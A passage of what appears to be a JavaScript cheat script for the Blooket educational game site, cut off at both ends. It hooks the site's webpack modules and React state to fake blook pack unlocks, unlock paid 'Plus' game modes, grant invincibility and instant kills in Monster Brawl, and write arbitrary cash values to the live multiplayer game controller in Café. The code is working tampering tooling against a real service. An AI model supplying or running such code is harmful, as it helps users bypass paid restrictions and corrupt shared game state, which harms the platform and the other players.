                                                this.load.svg("legendary-6", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_dark_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-7", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/triangle_dark_orange.svg", { width: 30, height: 30 });
                                                break;
                                            case "chroma":
                                                this.load.svg("chroma-1", "https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_turquoise.svg", { width: 25, height: 25 });
                                                this.load.svg("chroma-2", "https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_light_turquoise.svg", { width: 25, height: 25 });
                                                this.load.svg("chroma-3", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_dark_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-4", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-5", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-6", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_light_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-7", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/circle_dark_turquoise.svg", { width: 25, height: 25 });
                                        }
                                    }
                                    create() {
                                        scene.scene = this;
                                        scene.rarity = "";
                                        scene.particles = this.physics.add.group({
                                            classType: new phaser.Class({
                                                Extends: phaser.GameObjects.Image,
                                                initialize: function () {
                                                    phaser.GameObjects.Image.call(this, scene.scene, 0, 0, "uncommon-1");
                                                    this.setDepth(3);
                                                    this.lifespan = 0;
                                                },
                                                spawn: function (x, y, scale, velAngle, velSpeed, gravity, angle, lifespan, texture) {
                                                    this.setTexture(texture);
                                                    this.setActive(true);
                                                    this.setVisible(true);
                                                    this.setPosition(x, y);
                                                    this.setScale(scale);
                                                    this.targets = [];
                                                    scene.scene.physics.velocityFromAngle(velAngle, velSpeed, this.body.velocity);
                                                    this.body.setGravityY(gravity);
                                                    this.body.setAngularVelocity(angle);
                                                    this.lifespan = lifespan;
                                                },
                                                update: function (t, s) {
                                                    this.lifespan -= s;
                                                    if (this.lifespan > 0) return;
                                                    this.setActive(!1);
                                                    this.setVisible(!1);
                                                }
                                            }),
                                            runChildUpdate: !0
                                        });
                                        this.nextParticle = 0;
                                        this.numExplosions = 0;
                                        this.game.events.on("start-particles", (t) => {
                                            scene.rarity = t;
                                            this.numExplosions = "Uncommon" === t ? 75 : "Rare" === t ? 100 : -1;
                                        });
                                    }
                                    update(e, t) {
                                        const I = webpack("74sb");
                                        let Z = function (e) {
                                            switch (e) {
                                                case "center": {
                                                    var t = Object(I.l)(-115, -65);
                                                    return {
                                                        x: scene.scene.cameras.main.worldView.width / 2,
                                                        y: scene.scene.cameras.main.worldView.height / 2,
                                                        scale: Object(I.l)(.7, 1),
                                                        angle: t,
                                                        velocity: Object(I.l)(600, 750),
                                                        gravity: 700,
                                                        angVelocity: (t > -90 ? 1 : -1) * Object(I.l)(125, 175),
                                                        lifespan: 2500
                                                    }
                                                }
                                                case "right-bottom": return {
                                                    x: scene.scene.cameras.main.worldView.width,
                                                    y: scene.scene.cameras.main.worldView.height,
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-160, -110),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(-175, -125),
                                                    lifespan: 2500
                                                };
                                                case "left-bottom": return {
                                                    x: 0,
                                                    y: scene.scene.cameras.main.worldView.height,
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-70, -20),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(125, 175),
                                                    lifespan: 2500
                                                };
                                                case "top": return {
                                                    x: Object(I.l)(0, scene.scene.cameras.main.worldView.width),
                                                    y: -50,
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: 90,
                                                    velocity: Object(I.l)(0, 50),
                                                    gravity: 700,
                                                    angVelocity: Object(I.l)(-150, 150),
                                                    lifespan: 2500
                                                };
                                                case "right-shower": return {
                                                    x: scene.scene.cameras.main.worldView.width,
                                                    y: Object(I.l)(0, scene.scene.cameras.main.worldView.height),
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-180, -130),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(-175, -125),
                                                    lifespan: 2500
                                                };
                                                case "left-shower": return {
                                                    x: 0,
                                                    y: Object(I.l)(0, scene.scene.cameras.main.worldView.height),
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-50, 0),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(125, 175),
                                                    lifespan: 2500
                                                };
                                                case "right-diamond": {
                                                    var a = Object(I.l)(0, scene.scene.cameras.main.worldView.height);
                                                    return {
                                                        x: scene.scene.cameras.main.worldView.width,
                                                        y: a,
                                                        scale: Object(I.l)(.7, 1),
                                                        angle: a > scene.scene.cameras.main.worldView.height / 2 ? -150 : -210,
                                                        velocity: Object(I.l)(600, 750),
                                                        gravity: 0,
                                                        angVelocity: Object(I.l)(-175, -125),
                                                        lifespan: 2500
                                                    }
                                                }
                                                case "left-diamond": {
                                                    var n = Object(I.l)(0, scene.scene.cameras.main.worldView.height);
                                                    return {
                                                        x: 0,
                                                        y: n,
                                                        scale: Object(I.l)(.7, 1),
                                                        angle: n > scene.scene.cameras.main.worldView.height / 2 ? -30 : 30,
                                                        velocity: Object(I.l)(600, 750),
                                                        gravity: 0,
                                                        angVelocity: Object(I.l)(125, 175),
                                                        lifespan: 2500
                                                    }
                                                }
                                                default: return {};
                                            }
                                        };
                                        if (scene.rarity && 0 !== this.numExplosions && (this.nextParticle -= t, this.nextParticle <= 0)) {
                                            switch (scene.rarity) {
                                                case "Uncommon": {
                                                    for (let i = 0; i < 2; i++) {
                                                        let n = scene.particles.get();
                                                        n && n.spawn.apply(n, Object.values(Z("center")).concat(`uncommon-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Rare": {
                                                    for (var o = 0; o < 2; o++) {
                                                        var r = scene.particles.get();
                                                        r && r.spawn.apply(r, Object.values(Z(o % 2 == 0 ? "left-bottom" : "right-bottom")).concat(`rare-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Epic": {
                                                    for (var s = 0; s < 2; s++) {
                                                        var i = scene.particles.get();
                                                        i && i.spawn.apply(i, Object.values(Z(s % 2 == 0 ? "left-shower" : "right-shower")).concat(`epic-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Legendary": {
                                                    for (var l = 0; l < 3; l++) {
                                                        var c = scene.particles.get();
                                                        c && c.spawn.apply(c, Object.values(Z("top")).concat(`legendary-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Chroma": {
                                                    for (var u = 0; u < 3; u++) {
                                                        var d = scene.particles.get();
                                                        d && d.spawn.apply(d, Object.values(Z(u % 2 == 0 ? "left-diamond" : "right-diamond")).concat(`chroma-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                            }
                                            this.nextParticle = 20;
                                            this.numExplosions > 0 && (this.numExplosions = Math.max(this.numExplosions - 1, 0));
                                        }
                                    }
                                }
                                return function (box) {
                                    if (window.location.pathname !== "/market") return alert("This must be ran on the market page");
                                    let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                    let packs = webpack('fGzD');
                                    packs = Object.keys(packs.a).reduce((obj, pack) => (obj.packs.includes(pack) && (obj.data[pack] = Object.fromEntries(packs.b(pack))), obj), { packs: Array.from(document.querySelectorAll('[class*="packShadow"]')).map(x => x.alt), data: {} }).data;
                                    if (packs[box]) {
                                        function weighted(pack) {
                                            let weights = [];
                                            const items = Object.keys(packs[pack]);
                                            for (const key of items) weights.push(packs[pack][key] + (weights[items.indexOf(key) - 1] || 0));
                                            const choice = weights[weights.length - 1] * Math.random();
                                            return items[weights.findIndex(w => w >= choice)];
                                        }
                                        const blook = weighted(box);
                                        const allBlooks = Object.values(webpack.c).find(x => x.exports?.a?.Elephant).exports.a;
                                        stateNode.setState({
                                            loadingPack: false,
                                            openPack: true,
                                            unlockedBlook: blook,
                                            tokens: stateNode.state.tokens,
                                            newUnlock: true,
                                            game: {
                                                type: phaser.WEBGL,
                                                parent: "phaser-market",
                                                width: "100%",
                                                height: "100%",
                                                scale: { mode: phaser.Scale.NONE, autoCenter: phaser.Scale.CENTER_BOTH },
                                                transparent: true,
                                                physics: { default: "arcade" },
                                                scene: new Particles(allBlooks[blook].rarity)
                                            },
                                            canOpen: true
                                        });
                                    } else alert("I couldn't find that box!");
                                }
                            } catch { }
                        })()
                    },
                    {
                        name: "Simulate Unlock",
                        description: "Simulate unlocking most of the blooks",
                        inputs: [
                            {
                                name: "Blook",
                                type: "options",
                                options: () => {
                                    try {
                                        let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
                                        const cache = Object.values(webpack.c);
                                        const packs = cache.find(x => typeof x.exports.a?.Breakfast == "number").exports.a;
                                        return Object.entries(cache.find(x => x.exports.a?.Black).exports.a).reduce((a, [b, c]) => (packs[c.realSet || c.set] ? a.concat(b) : a), []);
                                    } catch { return []; }
                                }
                            }
                        ],
                        run: (function () {
                            try {
                                let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
                                let values = Object.values(webpack.c),
                                    blooks = values.find(x => x.exports?.a?.Chick?.set).exports.a,
                                    packs = values.find(x => x.exports.a?.Breakfast).exports.a,
                                    allBlooks = Object.entries(blooks).reduce((a, [b, c]) => (packs[c.realSet || c.set] && (a[b] = c), a), {});
                                let phaser = Object.values(webpack.c).find(x => x.exports?.Class).exports;
                                let scene = {};
                                class Particles extends phaser.Scene {
                                    constructor(rarity) {
                                        super();
                                        this.rarity = rarity.toLowerCase();
                                    }
                                    preload() {
                                        switch (this.rarity) {
                                            case "uncommon":
                                                this.load.svg("uncommon-1", "https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_green.svg", { width: 25, height: 25 });
                                                this.load.svg("uncommon-2", "https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_light_green.svg", { width: 25, height: 25 });
                                                this.load.svg("uncommon-3", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/circle_dark_green.svg", { width: 25, height: 25 });
                                                this.load.svg("uncommon-4", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_dark_green.svg", { width: 30, height: 30 });
                                                this.load.svg("uncommon-5", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_light_green.svg", { width: 30, height: 30 });
                                                this.load.svg("uncommon-6", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_light_green.svg", { width: 30, height: 30 });
                                                this.load.svg("uncommon-7", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_green.svg", { width: 30, height: 30 });
                                                break;
                                            case "rare":
                                                this.load.svg("rare-1", "https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_light_blue.svg", { width: 25, height: 25 });
                                                this.load.svg("rare-2", "https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_dark_blue.svg", { width: 25, height: 25 });
                                                this.load.svg("rare-3", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-4", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-5", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_light_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-6", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_light_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-7", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/circle_dark_blue.svg", { width: 25, height: 25 });
                                                break;
                                            case "epic":
                                                this.load.svg("epic-1", "https://media.blooket.com/image/upload/v1658790239/Media/market/particles/red.svg", { width: 25, height: 25 });
                                                this.load.svg("epic-2", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/light_red.svg", { width: 25, height: 25 });
                                                this.load.svg("epic-3", "https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-4", "https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_dark_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-5", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-6", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_light_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-7", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/circle_dark_red.svg", { width: 25, height: 25 });
                                                break;
                                            case "legendary":
                                                this.load.svg("legendary-1", "https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-2", "https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_light_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-3", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-4", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_orange.svg", { width: 30, height: 30 });
                                                this.load.svg("legendary-5", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_light_orange.svg", { width: 30, height: 30 });
                                                this.load.svg("legendary-6", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_dark_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-7", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/triangle_dark_orange.svg", { width: 30, height: 30 });
                                                break;
                                            case "chroma":
                                                this.load.svg("chroma-1", "https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_turquoise.svg", { width: 25, height: 25 });
                                                this.load.svg("chroma-2", "https://media.blooket.com/image/upload/v1658790246/Media/market/particles/square_light_turquoise.svg", { width: 25, height: 25 });
                                                this.load.svg("chroma-3", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_dark_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-4", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/serpentine_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-5", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-6", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/triangle_light_turquoise.svg", { width: 30, height: 30 });
                                                this.load.svg("chroma-7", "https://media.blooket.com/image/upload/v1658790244/Media/market/particles/circle_dark_turquoise.svg", { width: 25, height: 25 });
                                        }
                                    }
                                    create() {
                                        scene.scene = this;
                                        scene.rarity = "";
                                        scene.particles = this.physics.add.group({
                                            classType: new phaser.Class({
                                                Extends: phaser.GameObjects.Image,
                                                initialize: function () {
                                                    phaser.GameObjects.Image.call(this, scene.scene, 0, 0, "uncommon-1");
                                                    this.setDepth(3);
                                                    this.lifespan = 0;
                                                },
                                                spawn: function (x, y, scale, velAngle, velSpeed, gravity, angle, lifespan, texture) {
                                                    this.setTexture(texture);
                                                    this.setActive(true);
                                                    this.setVisible(true);
                                                    this.setPosition(x, y);
                                                    this.setScale(scale);
                                                    this.targets = [];
                                                    scene.scene.physics.velocityFromAngle(velAngle, velSpeed, this.body.velocity);
                                                    this.body.setGravityY(gravity);
                                                    this.body.setAngularVelocity(angle);
                                                    this.lifespan = lifespan;
                                                },
                                                update: function (t, s) {
                                                    this.lifespan -= s;
                                                    if (this.lifespan > 0) return;
                                                    this.setActive(!1);
                                                    this.setVisible(!1);
                                                }
                                            }),
                                            runChildUpdate: !0
                                        });
                                        this.nextParticle = 0;
                                        this.numExplosions = 0;
                                        this.game.events.on("start-particles", (t) => {
                                            scene.rarity = t;
                                            this.numExplosions = "Uncommon" === t ? 75 : "Rare" === t ? 100 : -1;
                                        });
                                    }
                                    update(e, t) {
                                        const I = webpack("74sb");
                                        let Z = function (e) {
                                            switch (e) {
                                                case "center": {
                                                    var t = Object(I.l)(-115, -65);
                                                    return {
                                                        x: scene.scene.cameras.main.worldView.width / 2,
                                                        y: scene.scene.cameras.main.worldView.height / 2,
                                                        scale: Object(I.l)(.7, 1),
                                                        angle: t,
                                                        velocity: Object(I.l)(600, 750),
                                                        gravity: 700,
                                                        angVelocity: (t > -90 ? 1 : -1) * Object(I.l)(125, 175),
                                                        lifespan: 2500
                                                    }
                                                }
                                                case "right-bottom": return {
                                                    x: scene.scene.cameras.main.worldView.width,
                                                    y: scene.scene.cameras.main.worldView.height,
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-160, -110),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(-175, -125),
                                                    lifespan: 2500
                                                };
                                                case "left-bottom": return {
                                                    x: 0,
                                                    y: scene.scene.cameras.main.worldView.height,
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-70, -20),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(125, 175),
                                                    lifespan: 2500
                                                };
                                                case "top": return {
                                                    x: Object(I.l)(0, scene.scene.cameras.main.worldView.width),
                                                    y: -50,
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: 90,
                                                    velocity: Object(I.l)(0, 50),
                                                    gravity: 700,
                                                    angVelocity: Object(I.l)(-150, 150),
                                                    lifespan: 2500
                                                };
                                                case "right-shower": return {
                                                    x: scene.scene.cameras.main.worldView.width,
                                                    y: Object(I.l)(0, scene.scene.cameras.main.worldView.height),
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-180, -130),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(-175, -125),
                                                    lifespan: 2500
                                                };
                                                case "left-shower": return {
                                                    x: 0,
                                                    y: Object(I.l)(0, scene.scene.cameras.main.worldView.height),
                                                    scale: Object(I.l)(.7, 1),
                                                    angle: Object(I.l)(-50, 0),
                                                    velocity: Object(I.l)(600, 750),
                                                    gravity: 500,
                                                    angVelocity: Object(I.l)(125, 175),
                                                    lifespan: 2500
                                                };
                                                case "right-diamond": {
                                                    var a = Object(I.l)(0, scene.scene.cameras.main.worldView.height);
                                                    return {
                                                        x: scene.scene.cameras.main.worldView.width,
                                                        y: a,
                                                        scale: Object(I.l)(.7, 1),
                                                        angle: a > scene.scene.cameras.main.worldView.height / 2 ? -150 : -210,
                                                        velocity: Object(I.l)(600, 750),
                                                        gravity: 0,
                                                        angVelocity: Object(I.l)(-175, -125),
                                                        lifespan: 2500
                                                    }
                                                }
                                                case "left-diamond": {
                                                    var n = Object(I.l)(0, scene.scene.cameras.main.worldView.height);
                                                    return {
                                                        x: 0,
                                                        y: n,
                                                        scale: Object(I.l)(.7, 1),
                                                        angle: n > scene.scene.cameras.main.worldView.height / 2 ? -30 : 30,
                                                        velocity: Object(I.l)(600, 750),
                                                        gravity: 0,
                                                        angVelocity: Object(I.l)(125, 175),
                                                        lifespan: 2500
                                                    }
                                                }
                                                default: return {};
                                            }
                                        };
                                        if (scene.rarity && 0 !== this.numExplosions && (this.nextParticle -= t, this.nextParticle <= 0)) {
                                            switch (scene.rarity) {
                                                case "Uncommon": {
                                                    for (let i = 0; i < 2; i++) {
                                                        let n = scene.particles.get();
                                                        n && n.spawn.apply(n, Object.values(Z("center")).concat(`uncommon-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Rare": {
                                                    for (var o = 0; o < 2; o++) {
                                                        var r = scene.particles.get();
                                                        r && r.spawn.apply(r, Object.values(Z(o % 2 == 0 ? "left-bottom" : "right-bottom")).concat(`rare-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Epic": {
                                                    for (var s = 0; s < 2; s++) {
                                                        var i = scene.particles.get();
                                                        i && i.spawn.apply(i, Object.values(Z(s % 2 == 0 ? "left-shower" : "right-shower")).concat(`epic-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Legendary": {
                                                    for (var l = 0; l < 3; l++) {
                                                        var c = scene.particles.get();
                                                        c && c.spawn.apply(c, Object.values(Z("top")).concat(`legendary-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                                case "Chroma": {
                                                    for (var u = 0; u < 3; u++) {
                                                        var d = scene.particles.get();
                                                        d && d.spawn.apply(d, Object.values(Z(u % 2 == 0 ? "left-diamond" : "right-diamond")).concat(`chroma-${Object(I.m)(1, 8)}`))
                                                    }
                                                    break;
                                                }
                                            }
                                            this.nextParticle = 20;
                                            this.numExplosions > 0 && (this.numExplosions = Math.max(this.numExplosions - 1, 0));
                                        }
                                    }
                                }
                                return function (blook) {
                                    let i = document.createElement('iframe');
                                    document.body.append(i);
                                    window.alert = i.contentWindow.alert.bind(window);
                                    window.prompt = i.contentWindow.prompt.bind(window);
                                    i.remove();
                                    if (window.location.pathname == "/market") {
                                        let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                        stateNode.setState({
                                            loadingPack: false,
                                            openPack: true,
                                            unlockedBlook: blook,
                                            newUnlock: true,
                                            game: {
                                                type: phaser.WEBGL,
                                                parent: "phaser-market",
                                                width: "100%",
                                                height: "100%",
                                                scale: {
                                                    mode: phaser.Scale.NONE,
                                                    autoCenter: phaser.Scale.CENTER_BOTH
                                                },
                                                transparent: true,
                                                physics: {
                                                    default: "arcade"
                                                },
                                                scene: new Particles(allBlooks[blook].rarity)
                                            },
                                            canOpen: true
                                        });
                                    } else alert("This can only be ran on the market page!");
                                }
                            } catch { }
                        })()
                    },
                    {
                        name: "Unlock Plus Gamemodes",
                        description: "Allows you to play any gamemode that is plus only",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState(state => (state.gameModes.forEach(gm => gm.plusOnly = false), state));
                        }
                    }
                ],
            },
            brawl: {
                name: "Monster Brawl",
                img: "https://media.blooket.com/image/upload/v1655233787/Media/survivor/xp/Blue_xp_2.svg",
                cheats: [
                    {
                        name: "Double Enemy XP",
                        description: "Doubles enemy XP drop value",
                        run: function () {
                            for (const collider of Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('invulnerableTime'))) {
                                const enemies = collider.object2;
                                let _start = enemies.classType.prototype.start;
                                enemies.classType.prototype.start = function () { _start.apply(this, arguments), this.val *= 2 }
                                enemies.children.entries.forEach(e => e.val *= 2);
                            }
                        }
                    },
                    {
                        name: "Half Enemy Speed",
                        description: "Makes enemies move 2x slower",
                        run: function () {
                            for (const collider of Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('invulnerableTime'))) {
                                const enemies = collider.object2;
                                let _start = enemies.classType.prototype.start;
                                enemies.classType.prototype.start = function () { _start.apply(this, arguments), this.speed *= .5 }
                                enemies.children.entries.forEach(e => e.speed *= .5);
                            }
                        }
                    },
                    {
                        name: "Instant Kill",
                        description: "Sets all enemies health to 1",
                        run: function () {
                            for (const collider of Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('invulnerableTime'))) {
                                const enemies = collider.object2;
                                let _start = enemies.classType.prototype.start;
                                enemies.classType.prototype.start = function () { _start.apply(this, arguments), this.hp = 1 }
                                enemies.children.entries.forEach(e => e.hp = 1);
                            }
                        }
                    },
                    {
                        name: "Invincibility",
                        description: "Makes you invincible",
                        run: function () {
                            for (const collider of Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.filter(x => x.callbackContext?.toString().includes('invulnerableTime'))) collider.collideCallback = () => { };
                        }
                    },
                    {
                        name: "Magnet",
                        description: "Pulls all xp towards you",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.physics.world.colliders._active.find(x => x.collideCallback?.toString().includes('magnetTime')).collideCallback({ active: true }, { active: true, setActive() { }, setVisible() { } });
                        }
                    },
                    {
                        name: "Max Current Abilities",
                        description: "Maxes out all your current abilities",
                        run: function () {
                            const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            for (const [ability, level] of Object.entries(stateNode.state.abilities)) for (let i = 0; i < (10 - level); i++) stateNode.state.game.scene.game.events.emit("level up", ability, stateNode.state.abilities[ability]++);
                            stateNode.setState({
                                level: stateNode.state.game.scene.level = [1, 3, 5, 10, 15, 25, 35].sort((a, b) => Math.abs(a - stateNode.state.level) - Math.abs(b - stateNode.state.level))[0] - 1
                            });
                        }
                    },
                    {
                        name: "Next Level",
                        description: "Skips to the next level",
                        run: function () {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            let { object1: player, object2: xp } = stateNode.state.game.scene.physics.world.colliders._active.find(x => x.collideCallback?.toString().includes('emit("xp"'));
                            xp.get().spawn(player.x, player.y, ((e) => 1 === e ? 1 : e < 5 ? 5 : e < 10 ? 10 : e < 20 ? 20 : e < 30 ? 30 : e < 40 ? 40 : e < 50 ? 50 : 100)(stateNode.state.level) - stateNode.xp);
                        }
                    },
                    {
                        name: "Remove Obstacles",
                        description: "Removes all rocks and obstacles",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(body => {
                                try {
                                    if (body.gameObject.frame.texture.key.includes("obstacle")) body.gameObject.destroy();
                                } catch { }
                            });
                        }
                    },
                    {
                        name: "Kill Enemies",
                        description: "Kills all current enemies",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(x => x?.gameObject?.receiveDamage?.(x.gameObject.hp, 1));
                        }
                    },
                    {
                        name: "Reset Health",
                        description: "Resets health and gives invincibility for 3 seconds",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.state.game.scene.game.events._events.respawn.fn();
                        }
                    }
                ],
            },
            cafe: {
                name: "Caf\xe9",
                img: "https://media.blooket.com/image/upload/v1655161189/Media/survivor/Pizza_lvl1.svg",
                style: { transform: "rotate(22.5deg)" },
                cheats: [
                    {
                        name: "Max Items",
                        description: "Maxes out items in the shop (Only usable in the shop)",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (window.location.pathname !== "/cafe/shop") alert("This can only be run in the shop");
                            else {
                                const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                stateNode.setState({ items: Object.fromEntries(Object.entries(stateNode.state.items).map(x => [x[0], 5])) });
                            }
                        }
                    },
                    {
                        name: "Remove Customers",
                        description: "Skips the current customers (Not usable in the shop)",
                        run: function () {
                            const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.state.customers.forEach((customer, i) => Object.keys(customer).length && stateNode.removeCustomer(i, true));
                        }
                    },
                    {
                        name: "Reset Abilities",
                        description: "Resets used abilities in shop (Only usable in the shop)",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (window.location.pathname !== "/cafe/shop") alert("This can only be run in the shop");
                            else {
                                const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                stateNode.setState({ abilities: Object.fromEntries(Object.entries(stateNode.state.abilities).map(x => [x[0], 5])) });
                            }
                        }
                    },
                    {
                        name: "Set Cash",
                        description: "Sets cafe cash",
                        inputs: [{
                            name: "Amount",
                            type: "number"
                        }],
                        run: function (cafeCash) {
                            let { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.setState({ cafeCash });
                            stateNode.props.liveGameController.setVal({
                                path: `c/${stateNode.props.client.name}`,
                                val: {
                                    b: stateNode.props.client.blook,
                                    ca: cafeCash
                                }
                            });
                        }
                    },
                    {
                        name: "Stock Food",
                        description: "Stocks all food to 99 (Not usable in the shop)",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (window.location.pathname !== "/cafe") alert("This can't be run in the shop");
                            else {
                                const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                stateNode.setState({ foods: stateNode.state.foods.map(e => ({ ...e, stock: 99, level: 5 })) });
                            }
                        }
                    }
                ],
            },
            crypto: {
                name: "Crypto Hack",
                img: "https://media.blooket.com/image/upload/v1661496293/Media/uiTest/CryptoIcon.svg",
                cheats: [
                    {
                        name: "Choice ESP",
                        description: "Shows what each choice will give you",
                        type: "toggle",
